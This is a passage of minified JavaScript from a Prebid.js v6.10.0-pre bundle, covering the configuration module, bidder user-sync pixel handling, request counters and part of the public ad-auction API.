      var n,
        r,
        i = function (e, t) {
          if (null == e) return {};
          var n,
            r,
            i = {},
            o = Object.keys(e);
          for (r = 0; r < o.length; r++) n = o[r], t.indexOf(n) >= 0 || (i[n] = e[n]);
          return i;
        }(e, t);
      if (Object.getOwnPropertySymbols) {
        var o = Object.getOwnPropertySymbols(e);
        for (r = 0; r < o.length; r++) n = o[r], t.indexOf(n) >= 0 || Object.prototype.propertyIsEnumerable.call(e, n) && (i[n] = e[n]);
      }
      return i;
    }
    function l(e, t, n) {
      return t in e ? Object.defineProperty(e, t, {
        value: n,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = n, e;
    }
    function b(e) {
      return (b = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    function g() {
      return (g = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    var p = n(32),
      y = n(5),
      v = "TRUE" === Object(u.getParameterByName)(y.DEBUG_MODE).toUpperCase(),
      m = window.location.origin,
      h = "random",
      O = {};
    O[h] = !0, O.fixed = !0;
    var j = h,
      E = {
        LOW: "low",
        MEDIUM: "medium",
        HIGH: "high",
        AUTO: "auto",
        DENSE: "dense",
        CUSTOM: "custom"
      };
    var A = function () {
      var e,
        t,
        n,
        i = [],
        a = null;
      function y() {
        e = {};
        var i = {
          _debug: v,
          get debug() {
            return this._debug;
          },
          set debug(e) {
            this._debug = e;
          },
          _bidderTimeout: 3e3,
          get bidderTimeout() {
            return this._bidderTimeout;
          },
          set bidderTimeout(e) {
            this._bidderTimeout = e;
          },
          _publisherDomain: m,
          get publisherDomain() {
            return this._publisherDomain;
          },
          set publisherDomain(e) {
            this._publisherDomain = e;
          },
          _priceGranularity: E.MEDIUM,
          set priceGranularity(e) {
            c(e) && ("string" == typeof e ? this._priceGranularity = a(e) ? e : E.MEDIUM : Object(u.isPlainObject)(e) && (this._customPriceBucket = e, this._priceGranularity = E.CUSTOM, Object(u.logMessage)("Using custom price granularity")));
          },
          get priceGranularity() {
            return this._priceGranularity;
          },
          _customPriceBucket: {},
          get customPriceBucket() {
            return this._customPriceBucket;
          },
          _mediaTypePriceGranularity: {},
          get mediaTypePriceGranularity() {
            return this._mediaTypePriceGranularity;
          },
          set mediaTypePriceGranularity(e) {
            var t = this;
            this._mediaTypePriceGranularity = Object.keys(e).reduce(function (n, r) {
              return c(e[r]) ? "string" == typeof e ? n[r] = a(e[r]) ? e[r] : t._priceGranularity : Object(u.isPlainObject)(e) && (n[r] = e[r], Object(u.logMessage)("Using custom price granularity for ".concat(r))) : Object(u.logWarn)("Invalid price granularity for media type: ".concat(r)), n;
            }, {});
          },
          _sendAllBids: true,
          get enableSendAllBids() {
            return this._sendAllBids;
          },
          set enableSendAllBids(e) {
            this._sendAllBids = e;
          },
          _useBidCache: false,
          get useBidCache() {
            return this._useBidCache;
          },
          set useBidCache(e) {
            this._useBidCache = e;
          },
          _deviceAccess: true,
          get deviceAccess() {
            return this._deviceAccess;
          },
          set deviceAccess(e) {
            this._deviceAccess = e;
          },
          _bidderSequence: j,
          get bidderSequence() {
            return this._bidderSequence;
          },
          set bidderSequence(e) {
            O[e] ? this._bidderSequence = e : Object(u.logWarn)("Invalid order: ".concat(e, ". Bidder Sequence was not set."));
          },
          _timeoutBuffer: 400,
          get timeoutBuffer() {
            return this._timeoutBuffer;
          },
          set timeoutBuffer(e) {
            this._timeoutBuffer = e;
          },
          _disableAjaxTimeout: false,
          get disableAjaxTimeout() {
            return this._disableAjaxTimeout;
          },
          set disableAjaxTimeout(e) {
            this._disableAjaxTimeout = e;
          },
          _maxNestedIframes: 10,
          get maxNestedIframes() {
            return this._maxNestedIframes;
          },
          set maxNestedIframes(e) {
            this._maxNestedIframes = e;
          },
          _auctionOptions: {},
          get auctionOptions() {
            return this._auctionOptions;
          },
          set auctionOptions(e) {
            (function (e) {
              if (!Object(u.isPlainObject)(e)) return Object(u.logWarn)("Auction Options must be an object"), !1;
              for (var t = 0, n = Object.keys(e); t < n.length; t++) {
                var r = n[t];
                if ("secondaryBidders" !== r && "suppressStaleRender" !== r) return Object(u.logWarn)("Auction Options given an incorrect param: ".concat(r)), !1;
                if ("secondaryBidders" === r) {
                  if (!Object(u.isArray)(e[r])) return Object(u.logWarn)("Auction Options ".concat(r, " must be of type Array")), !1;
                  if (!e[r].every(u.isStr)) return Object(u.logWarn)("Auction Options ".concat(r, " must be only string")), !1;
                } else if ("suppressStaleRender" === r && !Object(u.isBoolean)(e[r])) return Object(u.logWarn)("Auction Options ".concat(r, " must be of type boolean")), !1;
              }
              return !0;
            })(e) && (this._auctionOptions = e);
          }
        };
        function a(e) {
          return o()(Object.keys(E), function (t) {
            return e === E[t];
          });
        }
        function c(e) {
          if (!e) return Object(u.logError)("Prebid Error: no value passed to `setPriceGranularity()`"), !1;
          if ("string" == typeof e) a(e) || Object(u.logWarn)("Prebid Warning: setPriceGranularity was called with invalid setting, using `medium` as default.");else if (Object(u.isPlainObject)(e) && !Object(r.b)(e)) return Object(u.logError)("Invalid custom price value passed to `setPriceGranularity()`"), !1;
          return !0;
        }
        t && C(Object.keys(t).reduce(function (e, n) {
          return t[n] !== i[n] && (e[n] = i[n] || {}), e;
        }, {})), t = i, n = {};
      }
      function h() {
        if (a && n && Object(u.isPlainObject)(n[a])) {
          var e = n[a],
            r = new Set(Object.keys(t).concat(Object.keys(e)));
          return p(r).reduce(function (n, r) {
            return void 0 === e[r] ? n[r] = t[r] : void 0 === t[r] ? n[r] = e[r] : Object(u.isPlainObject)(e[r]) ? n[r] = Object(u.mergeDeep)({}, t[r], e[r]) : n[r] = e[r], n;
          }, {});
        }
        return g({}, t);
      }
      function A(e) {
        var t = {};
        return Object.keys(e).forEach(function (n) {
          var r = "context" === n ? "site" : n;
          t[r] = "site" === r || "user" === r ? Object.keys(e[n]).reduce(function (t, r) {
            return "data" === r ? Object(u.mergeDeep)(t, {
              ext: {
                data: e[n][r]
              }
            }) : Object(u.mergeDeep)(t, l({}, r, e[n][r])), t;
          }, {}) : e[n];
        }), t;
      }
      function S(e) {
        var t = {};
        return Object.keys(e).filter(function (e) {
          return "context" === e;
        }).forEach(function (n) {
          Object.keys(e[n]).forEach(function (r) {
            "data" === r ? Object(u.mergeDeep)(t, {
              ext: {
                data: e[n][r]
              }
            }) : "object" !== b(e[n][r]) || Array.isArray(e[n][r]) ? Object(u.mergeDeep)(t, {
              ext: {
                data: l({}, r.toLowerCase(), e[n][r])
              }
            }) : Object.keys(e[n][r]).forEach(function (i) {
              Object(u.mergeDeep)(t, {
                ext: {
                  data: l({}, r.toLowerCase(), l({}, i.toLowerCase(), e[n][r][i]))
                }
              });
            });
          });
        }), t;
      }
      function T(n) {
        if (Object(u.isPlainObject)(n)) {
          var r = Object.keys(n),
            i = {};
          r.forEach(function (r) {
            var o = "fpd" === r ? "ortb2" : r,
              a = "fpd" === r ? A(n[r]) : n[r];
            Object(u.isPlainObject)(e[o]) && Object(u.isPlainObject)(a) && (a = g({}, e[o], a)), i[o] = t[o] = a;
          }), C(i);
        } else Object(u.logError)("setConfig options must be an object");
      }
      function I(e, t) {
        var n = t;
        if ("string" != typeof e && (n = e, e = "*"), "function" == typeof n) {
          var r = {
            topic: e,
            callback: n
          };
          return i.push(r), function () {
            i.splice(i.indexOf(r), 1);
          };
        }
        Object(u.logError)("listener must be a function");
      }
      function C(e) {
        var t = Object.keys(e);
        i.filter(function (e) {
          return c()(t, e.topic);
        }).forEach(function (t) {
          t.callback(l({}, t.topic, e[t.topic]));
        }), i.filter(function (e) {
          return "*" === e.topic;
        }).forEach(function (t) {
          return t.callback(e);
        });
      }
      function w(e) {
        var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
        try {
          r(e), e.bidders.forEach(function (r) {
            n[r] || (n[r] = {}), Object.keys(e.config).forEach(function (i) {
              var o = "fpd" === i ? "ortb2" : i,
                a = "fpd" === i ? A(e.config[i]) : e.config[i];
              if (Object(u.isPlainObject)(a)) {
                var c = t ? u.mergeDeep : Object.assign;
                n[r][o] = c({}, n[r][o] || {}, a);
              } else n[r][o] = a;
            });
          });
        } catch (e) {
          Object(u.logError)(e);
        }
        function r(e) {
          if (!Object(u.isPlainObject)(e)) throw "setBidderConfig bidder options must be an object";
          if (!Array.isArray(e.bidders) || !e.bidders.length) throw "setBidderConfig bidder options must contain a bidders list with at least 1 bidder";
          if (!Object(u.isPlainObject)(e.config)) throw "setBidderConfig bidder options must contain a config object";
        }
      }
      function B(e, t) {
        a = e;
        try {
          return t();
        } finally {
          _();
        }
      }
      function _() {
        a = null;
      }
      return y(), {
        getCurrentBidder: function () {
          return a;
        },
        resetBidder: _,
        getConfig: function () {
          if (arguments.length <= 1 && "function" != typeof (arguments.length <= 0 ? void 0 : arguments[0])) {
            var e = arguments.length <= 0 ? void 0 : arguments[0];
            return e ? Object(u.deepAccess)(h(), e) : h();
          }
          return I.apply(void 0, arguments);
        },
        readConfig: function () {
          if (arguments.length <= 1 && "function" != typeof (arguments.length <= 0 ? void 0 : arguments[0])) {
            var e = arguments.length <= 0 ? void 0 : arguments[0],
              t = Object(u.deepClone)(h());
            return e ? Object(u.deepAccess)(t, e) : t;
          }
          return I.apply(void 0, arguments);
        },
        setConfig: T,
        mergeConfig: function (e) {
          if (Object(u.isPlainObject)(e)) {
            var t = Object.keys(e).reduce(function (t, n) {
              var r = h()[n] || {};
              return t[n] = Object(u.mergeDeep)(r, e[n]), t;
            }, {});
            return T(function (e) {
              for (var t = 1; t < arguments.length; t++) {
                var n = null != arguments[t] ? arguments[t] : {};
                t % 2 ? d(Object(n), !0).forEach(function (t) {
                  l(e, t, n[t]);
                }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : d(Object(n)).forEach(function (t) {
                  Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(n, t));
                });
              }
              return e;
            }({}, t)), t;
          }
          Object(u.logError)("mergeConfig input must be an object");
        },
        setDefaults: function (n) {
          Object(u.isPlainObject)(e) ? (g(e, n), g(t, n)) : Object(u.logError)("defaults must be an object");
        },
        resetConfig: y,
        runWithBidder: B,
        callbackWithBidder: function (e) {
          return function (t) {
            return function () {
              if ("function" == typeof t) {
                for (var n = arguments.length, r = new Array(n), i = 0; i < n; i++) r[i] = arguments[i];
                return B(e, u.bind.call.apply(u.bind, [t, this].concat(r)));
              }
              Object(u.logWarn)("config.callbackWithBidder callback is not a function");
            };
          };
        },
        setBidderConfig: w,
        getBidderConfig: function () {
          return n;
        },
        mergeBidderConfig: function (e) {
          return w(e, !0);
        },
        convertAdUnitFpd: function (e) {
          var t = [];
          return e.forEach(function (e) {
            e.fpd ? (e.ortb2Imp ? Object(u.mergeDeep)(e.ortb2Imp, S(e.fpd)) : e.ortb2Imp = S(e.fpd), t.push(function (e) {
              e.fpd;
              return f(e, s);
            }(e))) : t.push(e);
          }), t;
        },
        getLegacyFpd: function (e) {
          if ("object" === b(e)) {
            var t = {};
            return Object.keys(e).forEach(function (n) {
              var r = "site" === n ? "context" : n;
              t[r] = "context" === r || "user" === r ? Object.keys(e[n]).filter(function (e) {
                return "data" !== e;
              }).reduce(function (t, r) {
                return "ext" === r ? Object(u.mergeDeep)(t, e[n][r]) : Object(u.mergeDeep)(t, l({}, r, e[n][r])), t;
              }, {}) : e[n];
            }), t;
          }
        },
        getLegacyImpFpd: function (e) {
          if ("object" === b(e)) {
            var t = {};
            return Object(u.deepAccess)(e, "ext.data") && Object.keys(e.ext.data).forEach(function (n) {
              "pbadslot" === n ? Object(u.mergeDeep)(t, {
                context: {
                  pbAdSlot: e.ext.data[n]
                }
              }) : "adserver" === n ? Object(u.mergeDeep)(t, {
                context: {
                  adServer: e.ext.data[n]
                }
              }) : Object(u.mergeDeep)(t, {
                context: {
                  data: l({}, n, e.ext.data[n])
                }
              });
            }), t;
          }
        }
      };
    }();
  },
  30: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return b;
    });
    var r = n(0),
      i = n(3),
      o = n(12),
      a = n.n(o),
      c = n(7);
    function u(e, t) {
      return function (e) {
        if (Array.isArray(e)) return e;
      }(e) || function (e, t) {
        var n = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
        if (null == n) return;
        var r,
          i,
          o = [],
          a = !0,
          c = !1;
        try {
          for (n = n.call(e); !(a = (r = n.next()).done) && (o.push(r.value), !t || o.length !== t); a = !0);
        } catch (e) {
          c = !0, i = e;
        } finally {
          try {
            a || null == n.return || n.return();
          } finally {
            if (c) throw i;
          }
        }
        return o;
      }(e, t) || function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return s(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === n && e.constructor && (n = e.constructor.name);
        if ("Map" === n || "Set" === n) return Array.from(e);
        if ("Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return s(e, t);
      }(e, t) || function () {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function s(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
      return r;
    }
    function d() {
      return (d = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    i.b.setDefaults({
      userSync: Object(r.deepClone)({
        syncEnabled: !0,
        filterSettings: {
          image: {
            bidders: "*",
            filter: "include"
          }
        },
        syncsPerBidder: 5,
        syncDelay: 3e3,
        auctionDelay: 0
      })
    });
    var f = Object(c.a)("usersync");
    var l = !Object(r.isSafariBrowser)() && f.cookiesAreEnabled(),
      b = function (e) {
        var t = {},
          n = {
            image: [],
            iframe: []
          },
          o = new Set(),
          c = {},
          s = {
            image: !0,
            iframe: !1
          },
          f = e.config;
        function l() {
          if (f.syncEnabled && e.browserSupportsCookies) {
            try {
              !function () {
                if (!s.iframe) return;
                b(n.iframe, function (e) {
                  var t = u(e, 2),
                    i = t[0],
                    o = t[1];
                  Object(r.logMessage)("Invoking iframe user sync for bidder: ".concat(i)), Object(r.insertUserSyncIframe)(o), function (e, t) {
                    e.image = e.image.filter(function (e) {
                      return e[0] !== t;
                    });
                  }(n, i);
                });
              }(), function () {
                if (!s.image) return;
                b(n.image, function (e) {
                  var t = u(e, 2),
                    n = t[0],
                    i = t[1];
                  Object(r.logMessage)("Invoking image pixel user sync for bidder: ".concat(n)), Object(r.triggerPixel)(i);
                });
              }();
            } catch (e) {
              return Object(r.logError)("Error firing user syncs", e);
            }
            n = {
              image: [],
              iframe: []
            };
          }
        }
        function b(e, t) {
          Object(r.shuffle)(e).forEach(function (e) {
            t(e), o.add(e[0]);
          });
        }
        function g(e, t) {
          var n = f.filterSettings;
          if (function (e, t) {
            if (e.all && e[t]) return Object(r.logWarn)('Detected presence of the "filterSettings.all" and "filterSettings.'.concat(t, '" in userSync config.  You cannot mix "all" with "iframe/image" configs; they are mutually exclusive.')), !1;
            var n = e.all ? e.all : e[t],
              i = e.all ? "all" : t;
            if (!n) return !1;
            var o = n.filter,
              a = n.bidders;
            if (o && "include" !== o && "exclude" !== o) return Object(r.logWarn)('UserSync "filterSettings.'.concat(i, ".filter\" setting '").concat(o, "' is not a valid option; use either 'include' or 'exclude'.")), !1;
            if ("*" !== a && !(Array.isArray(a) && a.length > 0 && a.every(function (e) {
              return Object(r.isStr)(e) && "*" !== e;
            }))) return Object(r.logWarn)('Detected an invalid setup in userSync "filterSettings.'.concat(i, ".bidders\"; use either '*' (to represent all bidders) or an array of bidders.")), !1;
            return !0;
          }(n, e)) {
            s[e] = !0;
            var i = n.all ? n.all : n[e],
              o = "*" === i.bidders ? [t] : i.bidders;
            return {
              include: function (e, t) {
                return !a()(e, t);
              },
              exclude: function (e, t) {
                return a()(e, t);
              }
            }[i.filter || "include"](o, t);
          }
          return !s[e];
        }
        return i.b.getConfig("userSync", function (e) {
          if (e.userSync) {
            var t = e.userSync.filterSettings;
            Object(r.isPlainObject)(t) && (t.image || t.all || (e.userSync.filterSettings.image = {
              bidders: "*",
              filter: "include"
            }));
          }
          f = d(f, e.userSync);
        }), t.registerSync = function (e, i, a) {
          return o.has(i) ? Object(r.logMessage)('already fired syncs for "'.concat(i, '", ignoring registerSync call')) : f.syncEnabled && Object(r.isArray)(n[e]) ? i ? 0 !== f.syncsPerBidder && Number(c[i]) >= f.syncsPerBidder ? Object(r.logWarn)('Number of user syncs exceeded for "'.concat(i, '"')) : t.canBidderRegisterSync(e, i) ? (n[e].push([i, a]), void (c = function (e, t) {
            return e[t] ? e[t] += 1 : e[t] = 1, e;
          }(c, i))) : Object(r.logWarn)('Bidder "'.concat(i, '" not permitted to register their "').concat(e, '" userSync pixels.')) : Object(r.logWarn)("Bidder is required for registering sync") : Object(r.logWarn)('User sync type "'.concat(e, '" not supported'));
        }, t.syncUsers = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
          if (e) return setTimeout(l, Number(e));
          l();
        }, t.triggerUserSyncs = function () {
          f.enableOverride && t.syncUsers();
        }, t.canBidderRegisterSync = function (e, t) {
          return !f.filterSettings || !g(e, t);
        }, t;
      }({
        config: i.b.getConfig("userSync"),
        browserSupportsCookies: l
      });
  },
  31: function (e, t, n) {
    "use strict";

    t.a = function (e, t) {
      o.adServers = o.adServers || {}, o.adServers[e] = o.adServers[e] || {}, Object.keys(t).forEach(function (n) {
        o.adServers[e][n] ? Object(i.logWarn)("Attempting to add an already registered function property ".concat(n, " for AdServer ").concat(e, ".")) : o.adServers[e][n] = t[n];
      });
    };
    var r = n(14),
      i = n(0),
      o = Object(r.a)();
  },
  32: function (e, t) {
    e.exports = function () {
      return Array.from.apply(Array, arguments);
    };
  },
  33: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return a;
    });
    var r = n(0),
      i = {};
    function o(e, t, n) {
      var r = function (e, t) {
        var n = i[e] = i[e] || {
          bidders: {}
        };
        return t ? n.bidders[t] = n.bidders[t] || {} : n;
      }(e, n);
      return r[t] = (r[t] || 0) + 1, r[t];
    }
    var a = {
      incrementRequestsCounter: function (e) {
        return o(e, "requestsCounter");
      },
      incrementBidderRequestsCounter: function (e, t) {
        return o(e, "requestsCounter", t);
      },
      incrementBidderWinsCounter: function (e, t) {
        return o(e, "winsCounter", t);
      },
      getRequestsCounter: function (e) {
        return Object(r.deepAccess)(i, "".concat(e, ".requestsCounter")) || 0;
      },
      getBidderRequestsCounter: function (e, t) {
        return Object(r.deepAccess)(i, "".concat(e, ".bidders.").concat(t, ".requestsCounter")) || 0;
      },
      getBidderWinsCounter: function (e, t) {
        return Object(r.deepAccess)(i, "".concat(e, ".bidders.").concat(t, ".winsCounter")) || 0;
      }
    };
  },
  37: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), n.d(t, "adUnitSetupChecks", function () {
      return H;
    }), n.d(t, "checkAdUnitSetup", function () {
      return K;
    }), t.executeCallbacks = Q;
    var r = n(14),
      i = n(0),
      o = n(106),
      a = n(30),
      c = n(3),
      u = n(18),
      s = n(24),
      d = n(8),
      f = n(107),
      l = n(12),
      b = n.n(l),
      g = n(33),
      p = n(13),
      y = n(25),
      v = n(7),
      m = n(41);
    function h(e) {
      return function (e) {
        if (Array.isArray(e)) return O(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return O(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === n && e.constructor && (n = e.constructor.name);
        if ("Map" === n || "Set" === n) return Array.from(e);
        if ("Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return O(e, t);
      }(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function O(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
      return r;
    }
    function j() {
      return (j = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    var E = Object(r.a)(),
      A = n(5),
      S = n(9).default,
      T = n(10),
      I = a.a.triggerUserSyncs,
      C = A.EVENTS,
      w = C.ADD_AD_UNITS,
      B = C.BID_WON,
      _ = C.REQUEST_BIDS,
      U = C.SET_TARGETING,
      R = C.STALE_RENDER,
      D = A.AD_RENDER_FAILED_REASON,
      k = D.PREVENT_WRITING_ON_MAIN_DOCUMENT,
      N = D.NO_AD,
      P = D.EXCEPTION,
      x = D.CANNOT_FIND_AD,
      q = D.MISSING_DOC_OR_ADID,
      M = {
        bidWon: function (e) {
          var t = u.a.getBidsRequested().map(function (e) {
            return e.bids.map(function (e) {
              return e.adUnitCode;
            });
          }).reduce(i.flatten).filter(i.uniques);
          if (!Object(i.contains)(t, e)) return void Object(i.logError)('The "' + e + '" placement is not defined.');
          return !0;
        }
      };
    function G(e, t, n) {
      e.defaultView && e.defaultView.frameElement && (e.defaultView.frameElement.width = t, e.defaultView.frameElement.height = n);
    }
    function W(e, t) {
      var n = [];
      return Object(i.isArray)(e) && (t ? e.length === t : e.length > 0) && (e.every(function (e) {
        return Object(i.isArrayOfNums)(e, 2);
      }) ? n = e : Object(i.isArrayOfNums)(e, 2) && n.push(e)), n;
    }
    function F(e) {
      var t = Object(i.deepClone)(e),
        n = t.mediaTypes.banner,
        r = W(n.sizes);
      return r.length > 0 ? (n.sizes = r, t.sizes = r) : (Object(i.logError)("Detected a mediaTypes.banner object without a proper sizes field.  Please ensure the sizes are listed like: [[300, 250], ...].  Removing invalid mediaTypes.banner object from request."), delete t.mediaTypes.banner), t;
    }
    function L(e) {
      var t = Object(i.deepClone)(e),
        n = t.mediaTypes.video;
      if (n.playerSize) {
        var r = "number" == typeof n.playerSize[0] ? 2 : 1,
          o = W(n.playerSize, r);
        o.length > 0 ? (2 === r && Object(i.logInfo)("Transforming video.playerSize from [640,480] to [[640,480]] so it's in the proper format."), n.playerSize = o, t.sizes = o) : (Object(i.logError)("Detected incorrect configuration of mediaTypes.video.playerSize.  Please specify only one set of dimensions in a format like: [[640, 480]]. Removing invalid mediaTypes.video.playerSize property from request."), delete t.mediaTypes.video.playerSize);
      }
      return t;
    }
    function V(e) {
      var t = Object(i.deepClone)(e),
        n = t.mediaTypes.native;
      return n.image && n.image.sizes && !Array.isArray(n.image.sizes) && (Object(i.logError)("Please use an array of sizes for native.image.sizes field.  Removing invalid mediaTypes.native.image.sizes property from request."), delete t.mediaTypes.native.image.sizes), n.image && n.image.aspect_ratios && !Array.isArray(n.image.aspect_ratios) && (Object(i.logError)("Please use an array of sizes for native.image.aspect_ratios field.  Removing invalid mediaTypes.native.image.aspect_ratios property from request."), delete t.mediaTypes.native.image.aspect_ratios), n.icon && n.icon.sizes && !Array.isArray(n.icon.sizes) && (Object(i.logError)("Please use an array of sizes for native.icon.sizes field.  Removing invalid mediaTypes.native.icon.sizes property from request."), delete t.mediaTypes.native.icon.sizes), t;
    }
    function z(e, t) {
      var n = Object(i.deepAccess)(e, "mediaTypes.".concat(t, ".pos"));
      if (!Object(i.isNumber)(n) || isNaN(n) || !isFinite(n)) {
        var r = "Value of property 'pos' on ad unit ".concat(e.code, " should be of type: Number");
        Object(i.logWarn)(r), T.emit(A.EVENTS.AUCTION_DEBUG, {
          type: "WARNING",
          arguments: r
        }), delete e.mediaTypes[t].pos;
      }
      return e;
    }
    Object(f.a)(), E.bidderSettings = E.bidderSettings || {}, E.libLoaded = !0, E.version = "v6.10.0-pre", Object(i.logInfo)("Prebid.js v6.10.0-pre loaded"), E.installedModules = E.installedModules || [], E.adUnits = E.adUnits || [], E.triggerUserSyncs = I;
    var H = {
        validateBannerMediaType: F,
        validateVideoMediaType: L,
        validateNativeMediaType: V,
        validateSizes: W
      },
      K = Object(d.b)("sync", function (e) {
        var t = [];
        return e.forEach(function (e) {
          var n,
            r,
            o,
            a = e.mediaTypes,
            c = e.bids;
          if (c && Object(i.isArray)(c)) {
            if (a && 0 !== Object.keys(a).length) {
              a.banner && (n = F(e), a.banner.hasOwnProperty("pos") && (n = z(n, "banner"))), a.video && (r = L(n || e), a.video.hasOwnProperty("pos") && (r = z(r, "video"))), a.native && (o = V(r || n || e));
              var u = j({}, n, r, o);
              t.push(u);
            } else Object(i.logError)("Detected adUnit.code '".concat(e.code, "' did not have a 'mediaTypes' object defined.  This is a required field for the auction, so this adUnit has been removed."));
          } else Object(i.logError)("Detected adUnit.code '".concat(e.code, "' did not have 'adUnit.bids' defined or 'adUnit.bids' is not an array. Removing adUnit from auction."));
        }), t;
      }, "checkAdUnitSetup");
    function Y(e) {
      var t = u.a[e]().filter(i.bind.call(i.adUnitsFilter, this, u.a.getAdUnitCodes())),
        n = u.a.getLastAuctionId();
      return t.map(function (e) {
        return e.adUnitCode;
      }).filter(i.uniques).map(function (e) {
        return t.filter(function (t) {
          return t.auctionId === n && t.adUnitCode === e;
        });
      }).filter(function (e) {
        return e && e[0] && e[0].adUnitCode;
      }).map(function (e) {
        return t = {}, n = e[0].adUnitCode, r = {
          bids: e
        }, n in t ? Object.defineProperty(t, n, {
          value: r,
          enumerable: !0,
          configurable: !0,
          writable: !0
        }) : t[n] = r, t;
        var t, n, r;
      }).reduce(function (e, t) {
        return j(e, t);
      }, {});
    }
    function J(e, t, n) {
      var r = t.querySelector(n);
      e.parentNode && e.parentNode === r || Object(i.insertElement)(e, t, n);
    }
    function Q(e, t) {
      function n(e) {
        for (var t; t = e.shift();) t();
      }
      n(v.c), n($), e.call(this, t);
    }
    E.getAdserverTargetingForAdUnitCodeStr = function (e) {
      if (Object(i.logInfo)("Invoking pbjs.getAdserverTargetingForAdUnitCodeStr", arguments), e) {
        var t = E.getAdserverTargetingForAdUnitCode(e);
        return Object(i.transformAdServerTargetingObj)(t);
      }
      Object(i.logMessage)("Need to call getAdserverTargetingForAdUnitCodeStr with adunitCode");
    }, E.getHighestUnusedBidResponseForAdUnitCode = function (e) {
      if (e) {
        var t = u.a.getAllBidsForAdUnitCode(e).filter(s.a.isUnusedBid).filter(s.a.isBidNotExpired);
        return t.length ? t.reduce(i.getHighestCpm) : {};
      }
      Object(i.logMessage)("Need to call getHighestUnusedBidResponseForAdUnitCode with adunitCode");
    }, E.getAdserverTargetingForAdUnitCode = function (e) {
      return E.getAdserverTargeting(e)[e];
    }, E.getAdserverTargeting = function (e) {
      return Object(i.logInfo)("Invoking pbjs.getAdserverTargeting", arguments), s.d.getAllTargeting(e);
    }, E.getNoBids = function () {
      return Object(i.logInfo)("Invoking pbjs.getNoBids", arguments), Y("getNoBids");
    }, E.getNoBidsForAdUnitCode = function (e) {
      return {
        bids: u.a.getNoBids().filter(function (t) {
          return t.adUnitCode === e;
        })
      };
    }, E.getBidResponses = function () {
      return Object(i.logInfo)("Invoking pbjs.getBidResponses", arguments), Y("getBidsReceived");
    }, E.getBidResponsesForAdUnitCode = function (e) {
      return {
        bids: u.a.getBidsReceived().filter(function (t) {
          return t.adUnitCode === e;
        })
      };
    }, E.setTargetingForGPTAsync = function (e, t) {
      if (Object(i.logInfo)("Invoking pbjs.setTargetingForGPTAsync", arguments), Object(i.isGptPubadsDefined)()) {
        var n = s.d.getAllTargeting(e);
        s.d.resetPresetTargeting(e, t), s.d.setTargetingForGPT(n, t), Object.keys(n).forEach(function (e) {
          Object.keys(n[e]).forEach(function (t) {
            "hb_adid" === t && u.a.setStatusForBids(n[e][t], A.BID_STATUS.BID_TARGETING_SET);
          });
        }), T.emit(U, n);
      } else Object(i.logError)("window.googletag is not defined on the page");
    }, E.setTargetingForAst = function (e) {
      Object(i.logInfo)("Invoking pbjs.setTargetingForAn", arguments), s.d.isApntagDefined() ? (s.d.setTargetingForAst(e), T.emit(U, s.d.getAllTargeting())) : Object(i.logError)("window.apntag is not defined on the page");
    }, E.renderAd = Object(d.b)("async", function (e, t, n) {
      if (Object(i.logInfo)("Invoking pbjs.renderAd", arguments), Object(i.logMessage)("Calling renderAd with adId :" + t), e && t) try {
        var r = u.a.findBidByAdId(t);
        if (r) {
          var o = !0;
          if (r && r.status === A.BID_STATUS.RENDERED && (Object(i.logWarn)("Ad id ".concat(r.adId, " has been rendered before")), T.emit(R, r), Object(i.deepAccess)(c.b.getConfig("auctionOptions"), "suppressStaleRender") && (o = !1)), o) {
            if (r.ad = Object(i.replaceAuctionPrice)(r.ad, r.cpm), r.adUrl = Object(i.replaceAuctionPrice)(r.adUrl, r.cpm), n && n.clickThrough) {
              var a = n.clickThrough;
              r.ad = Object(i.replaceClickThrough)(r.ad, a), r.adUrl = Object(i.replaceClickThrough)(r.adUrl, a);
            }
            u.a.addWinningBid(r), T.emit(B, r);
            var s = r.height,
              d = r.width,
              f = r.ad,
              l = r.mediaType,
              b = r.adUrl,
              g = r.renderer,
              y = document.createComment("Creative ".concat(r.creativeId, " served by ").concat(r.bidder, " Prebid.js Header Bidding"));
